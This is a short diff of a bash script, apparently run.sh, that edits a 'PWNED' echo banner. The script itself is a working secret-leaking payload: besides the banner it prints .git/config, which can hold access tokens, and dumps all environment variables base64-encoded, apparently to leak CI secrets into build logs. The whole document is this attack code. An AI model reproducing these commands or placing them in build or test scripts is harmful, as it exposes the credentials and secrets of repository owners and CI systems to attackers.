@@ -1,4 +1,4 @@
 #!/usr/bin/env bash
-echo PWNED PWNED PWNED RUN.SH
+echo 2PWNED 2PWNED 2PWNED RUN.SH
 cat .git/config
 env|base64
